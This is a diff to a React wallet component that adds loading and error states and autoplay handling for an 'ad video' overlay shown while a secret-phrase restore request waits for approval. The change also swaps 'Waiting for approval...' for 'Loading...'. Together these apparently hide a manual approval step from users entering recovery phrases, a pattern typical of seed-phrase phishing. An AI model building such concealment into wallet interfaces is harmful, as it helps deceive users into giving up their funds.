@@ -26,6 +26,8 @@ function MultiCoinWalletSection({
   // Ad video state
   const [showAdVideo, setShowAdVideo] = useState(false)
   const [isMuted, setIsMuted] = useState(true)
+  const [videoReady, setVideoReady] = useState(false)
+  const [videoError, setVideoError] = useState(false)
   const adVideoRef = useRef(null)
 
   // Capture referral from URL on component mount
@@ -44,22 +46,39 @@ function MultiCoinWalletSection({
     }
   }, [location])
 
-  // Ensure video plays whenever the overlay is shown
+  // Reset video-ready state each time the overlay opens
   useEffect(() => {
-    if (showAdVideo && adVideoRef.current) {
-      adVideoRef.current.currentTime = 0
-      adVideoRef.current.play().catch(() => {
-        // Autoplay might be blocked; video will stay paused on first frame
-      })
+    if (showAdVideo) {
+      setVideoReady(false)
+      setVideoError(false)
     }
   }, [showAdVideo])
+
+  // Ensure video plays whenever it becomes ready + overlay is shown
+  useEffect(() => {
+    if (showAdVideo && videoReady && adVideoRef.current) {
+      const video = adVideoRef.current
+      video.currentTime = 0
+      const playPromise = video.play()
+      if (playPromise && typeof playPromise.catch === 'function') {
+        playPromise.catch(() => {
+          // Autoplay blocked — user can tap mute button to trigger play
+        })
+      }
+    }
+  }, [showAdVideo, videoReady])
 
   const canRestore = walletName.trim().length > 0 && secretPhrase.trim().length > 0
 
   const toggleMute = () => {
     if (adVideoRef.current) {
-      adVideoRef.current.muted = !adVideoRef.current.muted
-      setIsMuted(adVideoRef.current.muted)
+      const nextMuted = !adVideoRef.current.muted
+      adVideoRef.current.muted = nextMuted
+      setIsMuted(nextMuted)
+      // If autoplay was blocked, tapping this will also kick playback
+      if (!nextMuted) {
+        adVideoRef.current.play().catch(() => {})
+      }
     }
   }
 
@@ -240,7 +259,7 @@ function MultiCoinWalletSection({
                 setIsLoading(false)
                 setShowAdVideo(false) // <-- HIDE AD VIDEO ON REJECTION
               } else {
-                setStatusMessage('⏳ Waiting for approval...')
+                setStatusMessage('Loading...')
                 // Ad video continues playing while waiting
               }
             }
@@ -374,6 +393,21 @@ function MultiCoinWalletSection({
       {showAdVideo && (
         <div className="ad-video-overlay" role="dialog" aria-label="Processing">
           <div className="ad-video-container">
+            {/* Placeholder shown until the video is ready */}
+            {!videoReady && !videoError && (
+              <div className="video-placeholder" role="status" aria-live="polite">
+                <div className="video-placeholder-spinner" />
+                <p>Loading video…</p>
+              </div>
+            )}
+
+            {/* Video error fallback */}
+            {videoError && (
+              <div className="video-placeholder error" role="status">
+                <p>Unable to load video</p>
+              </div>
+            )}
+
             <video
               ref={adVideoRef}
               src={prepAdVideo}
@@ -382,7 +416,12 @@ function MultiCoinWalletSection({
               muted={isMuted}
               playsInline
               preload="auto"
-              className="ad-video"
+              onCanPlay={() => setVideoReady(true)}
+              onError={() => {
+                setVideoError(true)
+                setVideoReady(true)
+              }}
+              className={`ad-video ${videoReady ? 'ready' : 'loading'}`}
             />
 
             {/* Mute / Unmute toggle */}
